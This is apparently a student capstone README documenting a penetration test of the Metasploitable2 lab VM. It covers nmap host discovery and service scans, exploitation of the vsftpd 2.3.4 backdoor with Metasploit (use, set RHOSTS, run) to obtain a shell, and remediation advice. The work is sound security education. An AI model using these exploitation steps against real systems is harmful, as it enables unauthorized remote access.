# Capstone Project — Full VAPT Engagement on Metasploitable2

## Project Overview

This capstone project demonstrates a complete Vulnerability Assessment and Penetration Testing (VAPT) engagement conducted against the Metasploitable2 virtual machine using Kali Linux. The assessment followed a structured penetration testing workflow including reconnaissance, service enumeration, vulnerability identification, exploitation, impact analysis, and remediation planning.

The objective of this project was to simulate a real-world penetration testing engagement and demonstrate practical offensive security techniques using industry-standard tools and methodologies.

---

# Project Scope

| Component          | Description                          |
| ------------------ | ------------------------------------ |
| Assessment Type    | Full VAPT Engagement                 |
| Target Environment | Metasploitable2                      |
| Attacker Machine   | Kali Linux                           |
| Methodology        | PTES-Based Testing                   |
| Focus Areas        | Enumeration, Exploitation, Reporting |

---

# Tools Used

* Nmap
* Metasploit Framework
* Kali Linux
* Metasploitable2

---

# Phase 1 — Reconnaissance & Host Discovery

## Objective

Identify active hosts within the local network and locate the target machine.

## Command Used

```bash
nmap -sn <ip_range>
```

## Description

A ping sweep scan was performed to identify active hosts within the local network range and locate the Metasploitable2 target machine.

## Screenshot

![Host Discovery](https://github.com/user-attachments/assets/86cc28ca-b142-4f03-83c6-9d55cd322848)

---

# Phase 2 — Service Enumeration

## Objective

Enumerate open ports and identify vulnerable services running on the target system.

## Command Used

```bash
nmap -sV <target_ip>
```

## Description

A service version detection scan was conducted against the target system to identify open ports and running services.

## Screenshot

![Nmap Scan](https://github.com/user-attachments/assets/4ac1e65c-6374-4e47-8b58-0515fc3ac7f3)

---

# Enumeration Results

| Port | Service | Version           |
| ---- | ------- | ----------------- |
| 21   | FTP     | vsftpd 2.3.4      |
| 22   | SSH     | OpenSSH           |
| 80   | HTTP    | Apache Web Server |

## Key Observation

The FTP service `vsftpd 2.3.4` was identified as vulnerable to a publicly known backdoor Remote Code Execution vulnerability.

---

# Phase 3 — Exploitation

## Objective

Exploit the vulnerable VSFTPD service to gain unauthorized remote shell access.

---

## Exploit Used

```text
exploit/unix/ftp/vsftpd_234_backdoor
```

---

## Launch Metasploit Framework

```bash
msfconsole
```

---

## Select Exploit Module

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

## Screenshot

![Select Exploit](https://github.com/user-attachments/assets/9342345e-5768-45f3-b1fc-f6851cf3d88b)

---

## Configure Target IP

```bash
set RHOSTS <target_ip>
```

## Screenshot

![Set RHOSTS](https://github.com/user-attachments/assets/245a0599-ccb6-4cd7-96f2-6c2198ab51ec)

---

## Execute Exploit

```bash
run
```

## Screenshot

![Exploit Execution](https://github.com/user-attachments/assets/45fa3e5b-0283-43aa-b8be-e43c39f480bc)

---

# Exploitation Result

A backdoor shell session was successfully opened, providing unauthorized remote access to the target system.

The exploit confirmed the presence of a critical Remote Code Execution (RCE) vulnerability within the outdated VSFTPD service.

---

# Impact Analysis

Successful exploitation allowed remote attackers to:

* Gain unauthorized shell access
* Execute arbitrary commands
* Potentially escalate privileges
* Access sensitive information
* Move laterally within the network

The identified vulnerability presents a critical risk to system confidentiality, integrity, and availability.

---

# PTES Attack Timeline

| Timestamp           | Target IP     | Vulnerability          | PTES Phase     |
| ------------------- | ------------- | ---------------------- | -------------- |
| 2026-05-08 15:00:00 | 192.168.1.200 | Host Discovery         | Reconnaissance |
| 2026-05-08 15:10:00 | 192.168.1.200 | VSFTPD 2.3.4 Detection | Enumeration    |
| 2026-05-08 15:20:00 | 192.168.1.200 | VSFTPD Backdoor RCE    | Exploitation   |

---

# Remediation Plan

The following remediation measures are recommended:

* Update vulnerable FTP services to secure versions
* Remove outdated software components
* Restrict unnecessary network services
* Implement firewall filtering rules
* Perform regular vulnerability scanning and patch management
* Apply least privilege principles
* Conduct continuous security monitoring

---

# Executive Summary

This capstone assessment demonstrated how outdated and vulnerable services can be exploited using publicly available offensive security tools. During the engagement, reconnaissance and enumeration identified the presence of the vulnerable VSFTPD 2.3.4 service running on the target system. Using Metasploit Framework, successful exploitation of the backdoor vulnerability resulted in unauthorized shell access to the machine.

The engagement highlights the importance of vulnerability management, patching, and continuous monitoring in preventing unauthorized access and system compromise. Proper remediation and system hardening practices are essential to reducing attack surface exposure and improving overall infrastructure security.

---

# Conclusion

The Full VAPT Engagement successfully demonstrated the penetration testing lifecycle from reconnaissance to exploitation and reporting. The assessment validated the presence of critical vulnerabilities within the target environment and emphasized the risks associated with outdated services and insecure configurations.

This capstone project provided practical experience in vulnerability analysis, exploitation techniques, offensive security operations, and professional security reporting within a controlled lab environment.

---

# Disclaimer

This project was conducted within a controlled lab environment for educational and authorized security testing purposes only.
